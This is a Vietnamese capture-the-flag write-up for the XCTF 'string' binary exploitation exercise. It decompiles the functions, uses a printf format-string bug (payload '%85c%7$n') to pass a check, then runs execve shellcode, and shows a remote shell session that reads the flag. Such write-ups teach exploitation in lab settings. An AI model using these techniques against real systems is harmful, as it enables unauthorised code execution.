# XCTF - PWN Exercise - string

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/9_string λ checksec string 
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/9_string/string'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Vì code bài này khá dài nên mình sẽ không để toàn bộ code decompiler ở đây mà sẽ đi vào từng functions và phân tích chức năng và liên hệ giữa các functions qua trình dịch ngược IDA64 từ đó đưa ra khai thác. Bắt đầu từ hàm `main`.

```c
#include<stdio.h>

...

__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _DWORD *v4; // [rsp+18h] [rbp-78h]

  setbuf(stdout, 0LL);
  alarm(0x3Cu);
  sub_400996(60LL);

  v4 = malloc(8uLL);
  *v4 = 68;
  v4[1] = 85;

  puts("we are wizard, we will give you hand, you can not defeat dragon by yourself ...");
  puts("we will tell you two secret ...");
  printf("secret[0] is %x\n", v4);
  printf("secret[1] is %x\n", v4 + 1);
  puts("do not tell anyone ");

  sub_400D72(v4);
  
  puts("The End.....Really?");
  return 0LL;
}
```

Chúng ta quan tâm tới con trỏ v4 được cấp phát động, `v4 = 68` và `v4[1] = 85` và tương ứng với `secret[0]` và `secret[1]` được in ra là địa chỉ của `v4[0]` và `v4[1]`. Tiếp theo là hàm `sub_400D72` với đối số là v4.

```c
#include<stdio.h>
...
unsigned __int64 __fastcall sub_400D72(__int64 a1)
{
  char s[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("What should your character's name be:");
  _isoc99_scanf("%s", s);
  
  if ( strlen(s) <= 0xC )
  {
    puts("Creating a new player.");
    sub_400A7D();
    sub_400BB9();
    sub_400CA6(a1);
  }
  else
  {
    puts("Hei! What's up!");
  }
  return __readfsqword(0x28u) ^ v3;
}
...
```

Nhập `s` có độ dài nhỏ hơn 0xC, sau đó ta lần lượt phân tích ba hàm.

```c
#include<stdio.h>
...
unsigned __int64 sub_400A7D()
{
  char s1[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(" This is a famous but quite unusual inn. The air is fresh and the");
  puts("marble-tiled ground is clean. Few rowdy guests can be seen, and the");
  puts("furniture looks undamaged by brawls, which are very common in other pubs");
  puts("all around the world. The decoration looks extremely valuable and would fit");
  puts("into a palace, but in this city it's quite ordinary. In the middle of the");
  puts("room are velvet covered chairs and benches, which surround large oaken");
  puts("tables. A large sign is fixed to the northern wall behind a wooden bar. In");
  puts("one corner you notice a fireplace.");
  puts("There are two obvious exits: east, up.");
  puts("But strange thing is ,no one there.");
  puts("So, where you will go?east or up?:");
  while ( 1 )
  {
    _isoc99_scanf("%s", s1);
    if ( !strcmp(s1, "east") || !strcmp(s1, "east") )
      break;
    puts("hei! I'm secious!");
    puts("So, where you will go?:");
  }
  if ( strcmp(s1, "east") )
  {
    if ( !strcmp(s1, "up") )
      sub_4009DD();
    puts("YOU KNOW WHAT YOU DO?");
    exit(0);
  }
  return __readfsqword(0x28u) ^ v2;
}
...
```

Hàm thứ nhất `sub_400A7D`, chỉ cần nhập `east` để đi tiếp đến các hàm sau.

```c
#include<stdio.h>
...
unsigned __int64 sub_400BB9()
{
  int v1; // [rsp+4h] [rbp-7Ch] BYREF
  __int64 v2; // [rsp+8h] [rbp-78h] BYREF
  char format[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v2 = 0LL;
  puts("You travel a short distance east.That's odd, anyone disappear suddenly");
  puts(", what happend?! You just travel , and find another hole");
  puts("You recall, a big black hole will suckk you into it! Know what should you do?");
  puts("go into there(1), or leave(0)?:");
  _isoc99_scanf("%d", &v1);
  if ( v1 == 1 )
  {
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    _isoc99_scanf("%ld", &v2);          
// nhap 1 dia chi tai v2 o day, sau do thay doi gia tri dc luu tru trg dia chi nay thong qua lo hong chuoi dinh dang
    puts("And, you wish is:");
    _isoc99_scanf("%s", format);
    puts("Your wish is");
    printf(format);
    puts("I hear it, I hear it....");
  }
  return __readfsqword(0x28u) ^ v4;
}
...
```

Hàm thứ hai `sub_400BB9`, sau khi nhập `1` là giá trị của `v1` ta thấy `printf(format)` => chúng ta có thể sử dụng lỗ hổng kiểu chuỗi định dạng. Chúng ta có thể nhập một địa chỉ tại `v2` ở trên, và sau đó thay đổi giá trị được lưu trữ trong địa chỉ này thông qua lỗ hổng chuỗi định dạng đối với chuỗi kí tự `format`.

```c
#include<stdio.h>
...
unsigned __int64 __fastcall sub_400CA6(_DWORD *a1)
{
  void *v1; // rsi
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!");
  puts("Dragon say: HaHa! you were supposed to have a normal");
  puts("RPG game, but I have changed it! you have no weapon and ");
  puts("skill! you could not defeat me !");
  puts("That's sound terrible! you meet final boss!but you level is ONE!");
  if ( *a1 == a1[1] )
  {
    puts("Wizard: I will help you! USE YOU SPELL");
    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
    read(0, v1, 0x100uLL);
    ((void (__fastcall *)(_QWORD))v1)(0LL);
  }
  return __readfsqword(0x28u) ^ v3;
}
...
```

Hàm thứ ba `sub_400CA6(a1)`, đối số `a1` chính là con trỏ kiểu int `v4` ở hàm main, là địa chỉ nơi lưu trữ giá trị 65. Đọc nội dung trong hàm if cụ thể là chương trình sẽ đọc 1 chuỗi bằng con trỏ `v1` sau đó sẽ trỏ tới vị trí bắt đầu của chuỗi đó => có thể sử dụng shellcode tại `v1` này. 

Vấn đề là để thực thi nội dung trong if ta cần `*a1 == a1[1]` hay chính là `v4[0] = v4[1]`. Ta thấy hàm thứ hai `sub_400BB9` có lỗi `format-string`, từ đó có thể dùng lỗi fmt để làm v4[0] và v4[1] bằng nhau. 

Bây giờ những việc cần làm.
    +) Tìm xem biến `v2` của hàm `Hàm thứ hai sub_400BB9` là parameter thứ mấy.
    +) Sử dụng lỗi `Format string` của biến `format` để ghi đè giá trị v4[0] và v4[1] bằng nhau.
    +) Gửi shellcode x86_64 nữa là có thể lấy được flag. (shellcode execve(/bin/sh, 0, 0) x86_64 có rất nhiều trên mạng).
    
```
A voice heard in your mind
'Give me an address'
128
And, you wish is:
AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
Your wish is
AAAAAAAA-0x7fba55b82723-(nil)-0x7fba55aa3077-0xd-(nil)-0x100603018-0x80-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70I hear it, I hear it....
Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!
```

0x80 = 128, v2 nằm ở parameter thứ 7 trên stack. Bây giờ khi nhập v2 ta sẽ nhập địa chỉ được in ra ở secret[0] - địa chỉ của v4[0], sau đó nhập chuỗi `format` là `%85c%7$n` với 85 là giá trị của `v4[1]`.

Tiến hành viết file [exploit.py](exploit.py) và khai thác:

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/9_string λ python2 exploit.py 
[+] Opening connection to 111.200.241.244 on port 60918: Done
31858704
[*] Switching to interactive mode

$ ls
bin
dev
flag
lib
lib32
lib64
string
$ cat flag
cyberpeace{18a12ffd12d25b6047764f255f5fd3a1}
$  
```
